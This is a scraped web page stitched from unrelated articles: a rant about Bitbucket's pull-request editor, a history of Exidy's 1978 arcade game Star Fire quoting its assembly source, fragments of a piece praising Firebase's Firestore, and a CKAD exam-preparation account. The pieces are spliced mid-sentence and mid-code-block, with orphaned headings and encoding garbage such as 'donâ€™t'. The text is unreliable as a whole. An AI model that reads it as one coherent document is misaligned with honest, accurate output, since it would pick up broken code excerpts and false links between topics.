Select. Guess what, professional developers don’t need this help at all, and
newbies can search the web once and forget about this.</p>
<p>Think about ergonomics, with regular markdown you do everything with the keyboard,
with the BB inferno you first need to type the three backward ticks and then grab the
mouse and select your language and then click back on the code block.</p>
<p>This is a really poor understanding of your user’s UX!</p>
<p><img src="https://nosleepjavascript.com/e7b45f374d83485074abc0f93fc73afb/mdlang.gif" alt="selecting code block language"></p>
<h3 id="smart-dumb-markdown-hybrid-support"><a href="#smart-dumb-markdown-hybrid-support" aria-label="smart dumb markdown hybrid support permalink"></a>Smart (dumb) markdown hybrid support</h3>
<p>The <a href="https://en.wikipedia.org/wiki/WYSIWYG">WYSIWYG</a> <a href="https://guides.github.com/features/mastering-markdown/">markdown</a> hybrid implementation produces stuff like this</p>
<p><img src="https://nosleepjavascript.com/e0371b316a1ee15020dc166396db9c4c/format.gif" alt="format"></p>
<h3 id="list-items-without-an-empty-line"><a href="#list-items-without-an-empty-line" aria-label="list items without an empty line permalink"></a>List items without an empty line</h3>
<p>This cannot happen in the comment textbox unless you force it to, but
it can happen in the PR description textbox and it can also happen when you
write the markdown in a <em>regular</em> text editor / IDE i.e. when committing code
via git, when writing the README, etc.</p>
<p>If you don’t leave an empty line before a list then it won’t get transformed correctly:</p>
<p><img src="https://nosleepjavascript.com/c8e58d30c452b643bf40ea77f00b21d0/lists.gif" alt="markdown lists"></p>
<h2 id="performance-of-the-text-box"><a href="#performance-of-the-text-box" aria-label="performance of the text box permalink"></a>Performance of the text box</h2>
<p>I have a pretty good and modern computer but most of the time
I experience heavy lags when writing a simple text only comment in <a href="https://bitbucket.org/">BB</a>.</p>
<p>I suspect this is related to the horrible <a href="https://en.wikipedia.org/wiki/WYSIWYG">WYSIWYG</a> implementation,
which we have just heavily broken down above.</p>
<h2 id="doesnt-work-on-large-prs"><a href="#doesnt-work-on-large-prs" aria-label="doesnt work on large prs permalink"></a>Doesn’t work on large PRs</h2>
<p>When a PR is a large (I know, I know, large PRs should not happen, but unfortunately sometimes they do)
BB will choose either</p>
<ol>
<li>consuming a lot of resources</li>
<li>not displaying the entire PR</li>
</ol>
<p>In either case the UX ends up being bad.</p>
<p>In case <strong>1.</strong> you will get a lot of RAM being consumed and
most likely the scrolling and the interaction with the page
will be even more slow and awkward.</p>
<p>In case <strong>2.</strong> you need to click file by file to inspect a PR, which isn’t better IMO.</p>
<h2 id="bitbucket-is-jira-applied-to-git"><a href="#bitbucket-is-jira-applied-to-git" aria-label="bitbucket is jira applied to git permalink"></a>Bitbucket is Jira applied to git</h2>
<p>I’ve seen that the described behaviors tend to be cross
cutting problems across the <a href="https://www.atlassian.com/">Atlassian</a> suite, <a href="https://www.atlassian.com/software/jira">Jira</a> has similar
problems and <a href="https://confluence.atlassian.com/alldoc/atlassian-documentation-32243719.html">Confluence</a> is horrible, they are generally
really slow and clunky and unresponsive and text editing tends to be a pain.</p>
<h2 id="understanding-your-product"><a href="#understanding-your-product" aria-label="understanding your product permalink"></a>Understanding your product</h2>
<p>PRs are one of the core use cases of <a href="https://bitbucket.org/">BB</a> as a product,
they are what have arguably made <a href="https://github.com/">Github</a> the beacon that it is now.</p>
<p>There are a few things your PR experience needs to provide at the base level</p>
<ul>
<li>PR title, description and inline comments.</li>
<li>Every text box needs to support plain markdown and maybe mentioning other people (tagging).</li>
<li>If you want to add markdown shortcuts make them <em>insert markdown</em> and <strong>not</strong> actually applying style.</li>
<li>Good diffing visualization (which BB does well IMO).</li>
<li>It is all about the code!</li>
<li>Copying code from the diff needs to work as expected.</li>
<li>Markdown code blocks (code snippets) are a fundamental feature of all your text boxes.</li>
<li>Either provide a really good experience inside your code blocks or do nothing.</li>
<li>Your app needs to be simple, small, fast and stable in time.</li>
<li>Some PRs are open for long periods of time, make sure your app is stable!.</li>
</ul>
<p>These are one the core features a good PR UI needs to provide, if anything,
these need to be the best of the best.</p>
<p>BB seems to have prioritized being “cute” or “pretty” (is it?) instead of being functional.</p>
<h2 id="solutions"><a href="#solutions" aria-label="solutions permalink"></a>Solutions</h2>
<p><a href="https://bitbucket.org/">Bitbucket</a> is a developer centric platform, use developer centric tools,
use plain old text inputs with good markdown support, add as little as possible
on top of that, make the experience of writing comments, PR descriptions,
code snippets as easy, simple and fast as possible.</p>
<p>Don’t leak stuff from <a href="https://www.atlassian.com/software/jira">Jira</a> and <a href="https://confluence.atlassian.com/alldoc/atlassian-documentation-32243719.html">Confluence</a> to <a href="https://bitbucket.org/">Bitbucket</a>, they have different
audience.</p>
<p>And if you have time… make sure <em>every</em> text input in your system has a plain text
mode, where either you interpret it as good old markdown or as unformatted text, either
is much better than what you have now.</p>

		<p>Would you believe that chasing the high score was not always a part of arcade games? Indeed, until well after Pong it was not even a desired feature until 1978’s <em>Star Fire</em> took it to a whole new level. The tale of that game and its many innovations are what we will bring you today, as well as the source code which reveals even more secrets within the legendary game <em>Star Fire</em>.</p>
<p><em>(This article serves as a promotion for the author’s book Candid Conversations in Code: Interviews with the First Generation of Video Game Programmers now available through the website <a href="https://storybundle.com/games">Storybundle</a>. Gaming Alexandria receives no proceeds from the sale of this book. Read all about the careers of Star Fire creator David Rolfe and more amazingly talented game creators in the book’s pages, as well as receiving a number of other published works from leading game historians like Matt Barton and John Harris by purchasing from <a href="https://storybundle.com/games">Storybundle</a> today!)</em></p>

<p><iframe title="Arcade Longplay - Star Fire (1979) by Exidy" width="747" height="420" src="https://www.youtube.com/embed/N5r_SM-ugOU?feature=oembed" frameborder="0" allow="accelerometer; autoplay; encrypted-media; gyroscope; picture-in-picture" allowfullscreen=""></iframe></p>
<p><em>Star Fire</em>, as with all good ideas, came from a place of ambition. The man with the plan was a fellow named Ted Michon. Michon had worked as a technician at arcade company Digital Games/Micronetics, which set him up to become a game creator for them when he created an early microprocessor game for them called <em>Night Racer</em>. With a new direction for games taking shape and the company he worked for falling apart, Michon decided to form his own independent arcade development company called Techni-Cal in 1976.</p>
<p>Ted was an alumnus of California Technical Institute (CalTech) and knew some of the computer-saavy students behind him in seniority. From this pool he settled on the inventive David Rolfe, who was a hotshot assembly programmer at the school. Rolfe readily admits that he has no interest in games as a matter of enjoyment, but leaps at the chance to solve hard problems. The task Michon had ready for his new employee would scratch that itch.</p>
<figure id="attachment_10608" aria-describedby="caption-attachment-10608"><img loading="lazy" src="https://www.gamingalexandria.com/wp/wp-content/uploads/2020/08/01-Michon.png" alt="" width="305" height="345" srcset="https://www.gamingalexandria.com/wp/wp-content/uploads/2020/08/01-Michon.png 1208w, https://www.gamingalexandria.com/wp/wp-content/uploads/2020/08/01-Michon-265x300.png 265w, https://www.gamingalexandria.com/wp/wp-content/uploads/2020/08/01-Michon-904x1024.png 904w, https://www.gamingalexandria.com/wp/wp-content/uploads/2020/08/01-Michon-768x870.png 768w" sizes="(max-width: 305px) 100vw, 305px"><figcaption id="caption-attachment-10608">Michon on left, helping build the world’s tallest card tower in 1975.</figcaption></figure>
<p>Ted had become enamored with an obscure film called <em>Star Wars</em>, particularly the iconic spaceship battles. He wanted to create a game which had that same sense of high-flying freedom, as well as incorporating a color monitor (for which had had found a cheap supplier). These sorts of tasks in the late 1970s, preceding even Space Invaders, were tall orders. Michon had created a hardware to facilitate this feat though, so it was up to Rolfe to make it sing.</p>
<p>Coupled with Ted’s then girlfriend (later wife) Susan Owen helping with art, the three person team would work out of Michon’s apartment via a terminal connected to the mainframe at CalTech to embark on their <em>Star Wars</em>-inspired project. At one point they even had hope they could secure the <em>Star Wars</em> license, though no official Star Wars game would emerge until 1982. They would retain major inspirations from that initial concept though, like the title screen at the enemy spacecraft. Michon secured a tentative deal with arcade manufacturer Midway Manufacturing, subsidiary of Bally, and the team would begin to show them work in progress.</p>
<figure id="attachment_10609" aria-describedby="caption-attachment-10609"><img loading="lazy" src="https://www.gamingalexandria.com/wp/wp-content/uploads/2020/08/02-Rolfe.jpg" alt="" width="260" height="285" srcset="https://www.gamingalexandria.com/wp/wp-content/uploads/2020/08/02-Rolfe.jpg 571w, https://www.gamingalexandria.com/wp/wp-content/uploads/2020/08/02-Rolfe-274x300.jpg 274w" sizes="(max-width: 260px) 100vw, 260px"><figcaption id="caption-attachment-10609">David Rolfe</figcaption></figure>
<p>Rolfe’s first problem to solve was creating an efficient color system which would not consume all the expensive RAM at their disposal. A standard, modern color system would assign a bit for every two colors on the screen, but even a four color system at even standard resolution would be over 32K of RAM. Rolfe’s solution would allow for up to eight total colors which only used 1.8 bits per pixel, with some compromises. For instance the stars in the background could change color from white to blue if one of the Tie Fighter-based enemy ships passed in front of it. Likely this was a form of color-cels as <a href="https://www.youtube.com/watch?v=Tfh0ytz8S0k">used on the Commodore 64</a>, spread across much larger objects.</p>
<p>Then to make the ships appear as if they existed in a 3D space, Rolfe would have to implement a new technique called spite-scaling. <a href="https://youtu.be/k0uFSSzYaJ8?t=174">Taito’s <em>Interceptor</em></a> had deployed this technique, but that game was only available in Japan. By having Susan create several different images of the enemy spacecraft, Rolfe could switch between the different sizes on the fly to have the fighters swoop in. All of this required a lot of storage, so much so that <em>Star Fire</em> wound up using 21 separate ROM chips to store all the game graphics and code.</p>
<p>Even with the unprecedented excitement and novelty the game could show, Midway was not impressed by the gameplay of <em>Star Fire</em>. It was suggested that they add in an extra element for the player to shoot, and perplexingly Midway President Hank Ross said that this should be a witch on a bicycle, not a spaceship. Even with this additional, the game still wasn’t deemed up to their standards, so Ted and David were both released from their deal.</p>
<p><iframe title="Mattel Electronics Intellivision programmer interviews" width="747" height="560" src="https://www.youtube.com/embed/UDZq4OLg7wQ?start=37&amp;feature=oembed" frameborder="0" allow="accelerometer; autoplay; encrypted-media; gyroscope; picture-in-picture" allowfullscreen=""></iframe></p>
<p>With no money coming in, Rolfe had to find some extra work in the meantime. He joined up with APh Technology Consulting, who was at the time working on the programming backbone for what would become the Mattel Intellivision. Rolfe was directly responsible for providing a working prototype for the 1978 Winter CES, after which time Michon had managed to find a new buyer for their space flight game.</p>
<p>Exidy, a smaller arcade company out of Sunnyvale, California, was responsible for minor hits like <em>Death Race</em> and <em>Circus</em>. They were always seeking to push technological boundaries and thought <em>Star Fire</em> could be the sort of stand-out they needed. Rolfe returned to the project to make some minor changes – such as adding Exidy branding, including to an Enterprise-esque spaceship which replaced the witch – and the game was placed into a sit-down cabinet for increased immersion. It felt as close as they could get to the Star Wars game without a license.</p>
<p><img loading="lazy" src="https://www.gamingalexandria.com/wp/wp-content/uploads/2020/08/03-Star-Fire-Flyer-01.jpg" alt="" width="507" height="652" srcset="https://www.gamingalexandria.com/wp/wp-content/uploads/2020/08/03-Star-Fire-Flyer-01.jpg 1280w, https://www.gamingalexandria.com/wp/wp-content/uploads/2020/08/03-Star-Fire-Flyer-01-233x300.jpg 233w, https://www.gamingalexandria.com/wp/wp-content/uploads/2020/08/03-Star-Fire-Flyer-01-795x1024.jpg 795w, https://www.gamingalexandria.com/wp/wp-content/uploads/2020/08/03-Star-Fire-Flyer-01-768x989.jpg 768w, https://www.gamingalexandria.com/wp/wp-content/uploads/2020/08/03-Star-Fire-Flyer-01-1193x1536.jpg 1193w" sizes="(max-width: 507px) 100vw, 507px"></p>
<p>After release in November of 1978, Exidy did not find the mega-hit that they were looking for, but they did bring one significant innovation: The high score table. Rolfe had wanted to have players make a mark on the game as a signature of their accomplishments, and he felt that saving scores would be the best way to do that. Such a trick had never been done before. Some arcade owners might take down high scores by hand as part of a formal competition, but <em>Star Fire</em> put these competitive instincts into rigid code. Players would have a reason to return to a machine beyond the novelty, and that goalpost could change constantly, along with the ability to input their initials.</p>
<p>Following this, Rolfe would again work with Michon on the games Fire One and Kreepy Krawlers (unreleased) for Exidy before moving over to full-time on Intellivision work. Before that though, he had prepared a second version of Star Fire for export called ‘Star Fire II’ with fixes from its predecessor. Through the last 40 years, Rolfe has managed to maintain this source code for this game and has provided the opportunity for Gaming Alexandria to share its secrets!</p>
<p>The following observations were made by Ryou of <a href="http://sudden-desu.net/">Sudden Desu</a>, who delved into the Star Fire II code and extracted some interesting findings which support Rolfe’s tale.</p>
<hr>
<h2>STAR WARS</h2>
<p>The visual references are numerous and hard to ignore, from the STAR FIRE logo to the TIE fighter enemies, and even the Exidy ship which has the iconic X Wing laser guns. The David Rolfe interview elaborates on the reasoning behind this. The code is even more explicit in its references. SWARX.ASM is the code to draw the STAR FIRE logo on the title screen, and its TITLE directive is telling:</p>
<pre>TITLE "DO STAR WARS TITLE"</pre>
<p>When this code is called from ATRACT.ASM, it’s referred to as “SPACE WARS”</p>
<pre>CALL DOSWAR ;WRITE SPACE WARS SIGN</pre>
<p>The TIE fighter enemies are referred to by that name as well. TIE.ASM is their primary code.</p>
<pre>SEXTERN PS.TFIR,PS.PULS ;TIE FIGHTER FIRE IN INIT


;MUST BE CALLED BEFORE THE TIE FIGHTERS CYCLE THROUGH THE PSEUDO COLOR RAM
;THIS ROUTINE IS OPTIMIZED FOR SPEED BASE ON THE ASSUMPTION THAT
; MOST OF THE SCREEN IF FILLED WITH ZERO

</pre>
<h2>EASTER EGG</h2>
<p>Star Fire is known as being the first game which allowed for player initials to be saved alongside their score in the High Score list. This also means that Star Fire is the first game that has Easter Eggs based on player initials. The high score list code is located in ATRACT.ASM, and right at the top of the file we have this assembler expression:</p>
<pre>FT.GOD = -1 ;SET IF MACHINE KNOWS US</pre>
<p>And further down, among the code for the player initials input:</p>
<pre>IFE FT.GOD

<p>You may notice that the labels for Susan’s block of code are TRYSKO and GOTSKO, which implies the initials for the easter egg changed from SKO to SKM. (Did Susan get married along the way…?) Indeed, SKM only works for Star Fire II. In the original Star Fire sets, the initials for Susan’s easter …</p></div></div>

In this series, we will try to show you that making this decision is not a simple process and you need to analyze your app from multiple perspectives.</p></div></div></div></section><section><div><div><div><h2>Author</h2><div><p><img alt="" src="data:image/svg+xml;base64,PHN2ZyB3aWR0aD0iMzA0IiBoZWlnaHQ9IjE4OCIgdmlld0JveD0iMCAwIDMwNCAxODgiIGZpbGw9Im5vbmUiIHhtbG5zPSJodHRwOi8vd3d3LnczLm9yZy8yMDAwL3N2ZyI+PHBhdGggZD0iTTI5Ny4yNTkgMTMuNDQzYzMuNzIzIDAgNi43NDEtMy4wMSA2Ljc0MS02LjcyMkMzMDQgMy4wMSAzMDAuOTgyIDAgMjk3LjI1OSAwYy0zLjcyMiAwLTYuNzQgMy4wMS02Ljc0IDYuNzIxIDAgMy43MTIgMy4wMTggNi43MjIgNi43NCA2LjcyMnptMCA1Ny45NDVjMy43MjMgMCA2Ljc0MS0zLjAwOSA2Ljc0MS02LjcyIDAtMy43MTMtMy4wMTgtNi43MjItNi43NDEtNi43MjItMy43MjIgMC02Ljc0IDMuMDEtNi43NCA2LjcyMSAwIDMuNzEyIDMuMDE4IDYuNzIxIDYuNzQgNi43MjF6bTAgNTcuOTI1YzMuNzIzIDAgNi43NDEtMy4wMDkgNi43NDEtNi43MjFzLTMuMDE4LTYuNzIxLTYuNzQxLTYuNzIxYy0zLjcyMiAwLTYuNzQgMy4wMDktNi43NCA2LjcyMXMzLjAxOCA2LjcyMSA2Ljc0IDYuNzIxem0wIDU3Ljk0NmMzLjcyMyAwIDYuNzQxLTMuMDA5IDYuNzQxLTYuNzIxcy0zLjAxOC02LjcyMS02Ljc0MS02LjcyMWMtMy43MjIgMC02Ljc0IDMuMDA5LTYuNzQgNi43MjFzMy4wMTggNi43MjEgNi43NCA2LjcyMXpNMjM5LjE0NyAxMy40NDNjLTMuNzMgMC02Ljc0MS0zLjAwMi02Ljc0MS02LjcyMiAwLTMuNzIgMy4wMTEtNi43MjEgNi43NDEtNi43MjEgMy43MyAwIDYuNzQxIDMuMDAyIDYuNzQxIDYuNzIxLjAyMSAzLjcyLTMuMDExIDYuNzIyLTYuNzQxIDYuNzIyem0wIDU3Ljk0NWMtMy43MyAwLTYuNzQxLTMuMDAxLTYuNzQxLTYuNzIgMC0zLjcyIDMuMDExLTYuNzIyIDYuNzQxLTYuNzIyIDMuNzMgMCA2Ljc0MSAzLjAwMiA2Ljc0MSA2LjcyMS4wMjEgMy42OTgtMy4wMTEgNi43MjEtNi43NDEgNi43MjF6bTAgNTcuOTI1Yy0zLjczIDAtNi43NDEtMy4wMDItNi43NDEtNi43MjEgMC0zLjcyIDMuMDExLTYuNzIxIDYuNzQxLTYuNzIxIDMuNzMgMCA2Ljc0MSAzLjAwMSA2Ljc0MSA2LjcyMSAwIDMuNzE5LTMuMDExIDYuNzIxLTYuNzQxIDYuNzIxem0wIDU3Ljk0NmMtMy43MyAwLTYuNzQxLTMuMDAyLTYuNzQxLTYuNzIxIDAtMy43MiAzLjAxMS02LjcyMSA2Ljc0MS02LjcyMSAzLjczIDAgNi43NDEgMy4wMDEgNi43NDEgNi43MjEuMDIxIDMuNzE5LTMuMDExIDYuNzIxLTYuNzQxIDYuNzIxek0xODEuMDU2IDEzLjQ0M2MzLjcyMyAwIDYuNzQxLTMuMDEgNi43NDEtNi43MjIgMC0zLjcxMi0zLjAxOC02LjcyMS02Ljc0MS02LjcyMS0zLjcyMiAwLTYuNzQgMy4wMS02Ljc0IDYuNzIxIDAgMy43MTIgMy4wMTggNi43MjIgNi43NCA2LjcyMnptMCA1Ny45NDVjMy43MjMgMCA2Ljc0MS0zLjAwOSA2Ljc0MS02LjcyIDAtMy43MTMtMy4wMTgtNi43MjItNi43NDEtNi43MjItMy43MjIgMC02Ljc0IDMuMDEtNi43NCA2LjcyMSAwIDMuNzEyIDMuMDE4IDYuNzIxIDYuNzQgNi43MjF6bTAgNTcuOTI1YzMuNzIzIDAgNi43NDEtMy4wMDkgNi43NDEtNi43MjFzLTMuMDE4LTYuNzIxLTYuNzQxLTYuNzIxYy0zLjcyMiAwLTYuNzQgMy4wMDktNi43NCA2LjcyMXMzLjAxOCA2LjcyMSA2Ljc0IDYuNzIxem0wIDU3Ljk0NmMzLjcyMyAwIDYuNzQxLTMuMDA5IDYuNzQxLTYuNzIxcy0zLjAxOC02LjcyMS02Ljc0MS02LjcyMWMtMy43MjIgMC02Ljc0IDMuMDA5LTYuNzQgNi43MjFzMy4wMTggNi43MjEgNi43NCA2LjcyMXpNMTIyLjk0NCAxMy40NDNjMy43MjIgMCA2Ljc0LTMuMDEgNi43NC02LjcyMiAwLTMuNzEyLTMuMDE4LTYuNzIxLTYuNzQtNi43MjEtMy43MjMgMC02Ljc0MSAzLjAxLTYuNzQxIDYuNzIxIDAgMy43MTIgMy4wMTggNi43MjIgNi43NDEgNi43MjJ6bTAgNTcuOTQ1YzMuNzIyIDAgNi43NC0zLjAwOSA2Ljc0LTYuNzIgMC0zLjcxMy0zLjAxOC02LjcyMi02Ljc0LTYuNzIyLTMuNzIzIDAtNi43NDEgMy4wMS02Ljc0MSA2LjcyMSAwIDMuNzEyIDMuMDE4IDYuNzIxIDYuNzQxIDYuNzIxem0wIDU3LjkyNWMzLjcyMiAwIDYuNzQtMy4wMDkgNi43NC02LjcyMXMtMy4wMTgtNi43MjEtNi43NC02LjcyMWMtMy43MjMgMC02Ljc0MSAzLjAwOS02Ljc0MSA2LjcyMXMzLjAxOCA2LjcyMSA2Ljc0MSA2LjcyMXptMCA1Ny45NDZjMy43MjIgMCA2Ljc0LTMuMDA5IDYuNzQtNi43MjFzLTMuMDE4LTYuNzIxLTYuNzQtNi43MjFjLTMuNzIzIDAtNi43NDEgMy4wMDktNi43NDEgNi43MjFzMy4wMTggNi43MjEgNi43NDEgNi43MjF6TTY0Ljg1MyAxMy40NDNjMy43MjMgMCA2Ljc0LTMuMDEgNi43NC02LjcyMkM3MS41OTQgMy4wMSA2OC41NzcgMCA2NC44NTQgMHMtNi43NCAzLjAxLTYuNzQgNi43MjFjMCAzLjcxMiAzLjAxNyA2LjcyMiA2Ljc0IDYuNzIyem0wIDU3Ljk0NWMzLjcyMyAwIDYuNzQtMy4wMDkgNi43NC02LjcyIDAtMy43MTMtMy4wMTctNi43MjItNi43NC02LjcyMi0zLjcyMyAwLTYuNzQgMy4wMS02Ljc0IDYuNzIxIDAgMy43MTIgMy4wMTcgNi43MjEgNi43NCA2LjcyMXptMCA1Ny45MjVjMy43MjMgMCA2Ljc0LTMuMDA5IDYuNzQtNi43MjFzLTMuMDE3LTYuNzIxLTYuNzQtNi43MjFjLTMuNzIzIDAtNi43NCAzLjAwOS02Ljc0IDYuNzIxczMuMDE3IDYuNzIxIDYuNzQgNi43MjF6bTAgNTcuOTQ2YzMuNzIzIDAgNi43NC0zLjAwOSA2Ljc0LTYuNzIxcy0zLjAxNy02LjcyMS02Ljc0LTYuNzIxYy0zLjcyMyAwLTYuNzQgMy4wMDktNi43NCA2LjcyMXMzLjAxNyA2LjcyMSA2Ljc0IDYuNzIxek02Ljc0IDEzLjQ0M2MzLjcyMyAwIDYuNzQxLTMuMDEgNi43NDEtNi43MjJDMTMuNDgxIDMuMDEgMTAuNDYzIDAgNi43NDEgMCAzLjAxOCAwIDAgMy4wMSAwIDYuNzIxYzAgMy43MTIgMy4wMTggNi43MjIgNi43NCA2LjcyMnptMCA1Ny45NDVjMy43MjMgMCA2Ljc0MS0zLjAwOSA2Ljc0MS02LjcyIDAtMy43MTMtMy4wMTgtNi43MjItNi43NC02LjcyMi0zLjcyMyAwLTYuNzQxIDMuMDEtNi43NDEgNi43MjEgMCAzLjcxMiAzLjAxOCA2LjcyMSA2Ljc0IDYuNzIxem0wIDU3LjkyNWMzLjcyMyAwIDYuNzQxLTMuMDA5IDYuNzQxLTYuNzIxcy0zLjAxOC02LjcyMS02Ljc0LTYuNzIxYy0zLjcyMyAwLTYuNzQxIDMuMDA5LTYuNzQxIDYuNzIxczMuMDE4IDYuNzIxIDYuNzQgNi43MjF6bTAgNTcuOTQ2YzMuNzIzIDAgNi43NDEtMy4wMDkgNi43NDEtNi43MjFzLTMuMDE4LTYuNzIxLTYuNzQtNi43MjFjLTMuNzIzIDAtNi43NDEgMy4wMDktNi43NDEgNi43MjFzMy4wMTggNi43MjEgNi43NCA2LjcyMXoiIGZpbGw9IiNDQ0MiLz48L3N2Zz4="></p></div></div></div></div></section><section><div><div><div><h4><strong>Posts in the series:</strong></h4><p><strong>1.

For free you get services that complement each other with ergonomic and easy to bootstrap libraries. With Firestore libs you get all the goodies of Firebase suite - auth, serverless, storage, ML and others perfectly blended with the language specifics.<br></p><p><img src="https://prismic-io.s3.amazonaws.com/leancodelanding2/dc9745e6-6cc3-45d1-bbb9-c661003ebaf7_Group+1529.png"></p><p>The only bad thing about it is that they are pervasive - once you get them, you start using them everywhere. In all layers.

The truly killer feature - <strong>it can work </strong>(to some extent) <strong>offline.</strong> <em>Seamlessly</em>. If you have accessed the data previously, you can do so again without the Internet connection. You can even save the data there without active connection. Firestore libraries handle all the syncing, data merging, notifications and other problems.<br></p><h2><strong>You donâ€™t need backendâ€¦ sometimes<br></strong></h2><p><strong>Firebase platform (that Firestore is part of) might be a viable â€œbackendâ€� option for small, user-focused apps.</strong> If you use it alongside other SaaS solutions (e-mails, voice calls, etc.), you might be even able to build a not-so-small app without creating any traditional backend system.<br></p><p><img src="https://prismic-io.s3.amazonaws.com/leancodelanding2/0b913bc2-d221-491b-9f35-c4503a14c2bc_qwerty.png"></p><h4><strong><br>Firebase suite provides you with:</strong></h4><ol><li>Auth - Firebase Auth.</li><li>Storage - Firebase Cloud Storage.</li><li>Serverless - Firebase Cloud Functions.</li><li>Basic machine learning - Firebase ML.</li><li>A/B tests &amp; user-scoped configuration - Firebase Remote Configuration.</li><li>App distribution &amp; monitoring - Firebase App Distribution &amp; Crashlytics.</li><li>Many, many more.</li></ol><p><strong>Being Googleâ€™s product, it also integrates well with GCP.</strong> It blends with it more and more with every release and I suppose that soon, these two will be fully merged.</p><p>Having all these solutions in a single place, governed by the same IAM services and configured the same gives you a great advantage right at the beginning. It allows you to focus on what matters, leaving all the gritty details to Firebase. Even if you end up needing some more advanced backend features, you can always use <strong>Cloud Functions</strong> and do it the <em>normal way</em>.</p></div></div></div></section><section><div><div><div><div><p><img alt="" src="data:image/svg+xml;base64,PHN2ZyB3aWR0aD0iNzUiIGhlaWdodD0iMzgiIHZpZXdCb3g9IjAgMCA3NSAzOCIgZmlsbD0ibm9uZSIgeG1sbnM9Imh0dHA6Ly93d3cudzMub3JnLzIwMDAvc3ZnIj48cGF0aCBkPSJNNC4wODcgMzhMMCAzMy45NTEgMTQuODUgMTkuMDMgMCA0LjEwNyA0LjA4NyAwbDE4Ljg4IDE5LjAyOUw0LjA4NiAzOHptMjUuOTU5IDBsLTQuMDMtNC4wNDlMNDAuODY4IDE5LjAzIDI2LjAxNyA0LjEwNyAzMC4wNDcgMGwxOC45MzYgMTkuMDI5TDMwLjA0NiAzOHptMjYuMDE3IDBsLTQuMDg3LTQuMDQ5IDE0Ljg1LTE0LjkyMi0xNC44NS0xNC45MjJMNTYuMDYzIDAgNzUgMTkuMDI5IDU2LjA2MyAzOHoiIGZpbGw9IiMwMDAiLz48L3N2Zz4="></p></div></div><div><h2><strong>Examples</strong></h2><p><br>Firestore is great for many things.

Jagged GPS signal, no Internet, very slow connection, intermittent Internet connection, apparent connection - all need to be taken care of. With Firestore, we were able to handle all of the cases and give our users a solution that works everywhere, even in very remote areas, without that much of a development.Â&nbsp;</p><p>There are tons of other places where Firestore is a great solution, but Firestore simplicity can take its toll.

<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div>
<p>In this article, I will be describing my experience preparing for and taking the CKAD exam. A little bit about my background to relate with if you’re also on the same boat as I was: I am primarily a Software Developer; I’ve used mostly Python and Go. I have some experience in shell scripting and nearly negligible experience in DevOps.</p>
<p>First, we’ll spell out what the Certified Kubernetes Application Developer exam is. According to <a href="https://www.cncf.io/certification/ckad/" target="_blank" rel="noopener">the CNCF website</a>:</p>
<blockquote><p>“The Certified Kubernetes Application Developer exam certifies that users can design, build, configure, and expose cloud-native applications for Kubernetes.” </p><cite><a href="https://www.cncf.io/certification/ckad/" target="_blank" rel="noopener">CNCF</a></cite></blockquote>
<p>I recommend going through the CNCF website to understand the curriculum, exam tips, and other FAQs.</p>
<p>We’ll now dig into what it took me, an absolute beginner to DevOps, to prepare for the CKAD exam.</p>
<p>There are a few fundamental prerequisites such as Linux know-how, YAML configuration, Docker, etc., that one must know before proceeding to the Kubernetes world. I find the <a href="https://kodekloud.com/p/learning-path" target="_blank" rel="noopener">learning path</a> recommended on the <a href="https://kodekloud.com/courses/" target="_blank" rel="noopener">KodeKloud</a> website to be especially helpful to plan the order of learning the prerequisites.</p>
<h2>Certified Kubernetes Application Developer materials and courses</h2>
<div><figure><img loading="lazy" width="705" height="397" src="https://www.p3r.one/wp-content/uploads/2020/11/ckad-course-image.png" alt="Certified Kubernetes Application Developer" srcset="https://www.p3r.one/wp-content/uploads/2020/11/ckad-course-image.png 705w, https://www.p3r.one/wp-content/uploads/2020/11/ckad-course-image-480x270.png 480w" sizes="(min-width: 0px) and (max-width: 480px) 480px, (min-width: 481px) 705px, 100vw" title="How to become a Certified Kubernetes Application Developer in 2020 1"><figcaption>Certified Kubernetes Application Developer at KodeKloud</figcaption></figure></div>
<p>I did the following courses offered by KodeKloud (this is most definitely not a plug for KodeKloud, you may learn all of these from other sources if you wish) in the order listed below.</p>
<p><strong>Linux </strong>– <strong>The Linux Basics Course</strong>. This course might not be necessary for everyone. If you’re familiar with the Linux terminal, basic commands, and comfortable using the Linux terminal, then you’re good to go.</p>
<p><strong>Automation</strong> – <strong>Ansible for Beginners.</strong> It is essential to understand how the YAML configuration works and know the data structures used in a YAML file. This course explains all of this and provides exercises for hands-on practising, among other topics.</p>
<p><strong>Docker – Docker for Absolute Beginners, Docker – SWARM | SERVICES | STACKS</strong>. Before jumping directly to Kubernetes, I think it is essential to understand the fundamentals of containers and container-based systems. Learning about the Docker platform is a great way to start with it. Once you are familiar with the basics of Docker, proceed further to learn advanced topics such as Docker Swarm, Services, etc., These courses should provide you with a pretty strong foundation to being learning Kubernetes.</p>
<p><strong>Kubernetes – Kubernetes for the Absolute Beginners, Certified Kubernetes Application Developer</strong>. These courses explain the core concepts in Kubernetes very well. The content of the CKAD course is tailor-made to fit the CKAD exam curriculum. Working through these courses, their practice materials, and mock exam should give one enough idea about the actual exam. I would also like to add that only these courses might not be sufficient to excel in the exam. Find more resources to help you practice.</p>
<p>What I find noteworthy about these courses is that KodeKloud provides a virtual lab to practice what you have learnt right away. Personally, for me, this is a huge plus. If you have only been watching a bunch of videos without getting your hands dirty, then it is not going to be of much use.</p>
<p>Other helpful resources to prepare for the exam:</p>
<ol type="1"><li><a href="https://github.com/dgkanatsios/CKAD-exercises" target="_blank" rel="noopener">https://github.com/dgkanatsios/CKAD-exercises</a> – This is extremely helpful for more practice questions.</li><li>Even more practice – <a href="https://medium.com/bb-tutorials-and-thoughts/practice-enough-with-these-questions-for-the-ckad-exam-2f42d1228552" target="_blank" rel="noopener">https://medium.com/bb-tutorials-and-thoughts/practice-enough-with-these-questions-for-the-ckad-exam-2f42d1228552</a></li></ol>
<h2>Tips for pulling off the Certified Kubernetes Application Developer exam</h2>
<p>There are a few key aspects that will help you with the exam.</p>
<ol type="1"><li><strong>Familiarity</strong> – Familiarize yourself with the exam curriculum, the kubectl command, exporting to a yaml definition file (instead of writing one from scratch), and editing it as needed.</li><li><strong>Practice</strong> – The more you practice, the more familiar you are with the commands and shortcuts you learn along the way. Practising will also help you respond faster.</li><li><strong>Speed</strong> – Speed is particularly crucial to ace the exam. You have about 2 hours to answer 19 questions. And each of these questions may have sub-tasks. Again, at the cost of repeating myself, practice, practice, keep practising!</li><li><strong>Helpful resources during the exam</strong> – You do not have to remember definitions of all the Kubernetes resources. You have access to Kubernetes documentation during the exam to look up any information you want. Besides documentation, you can also use the <strong>‘kubectl explain’</strong> command to look up any resource. Learn how to use the <strong>‘kubectl explain’ 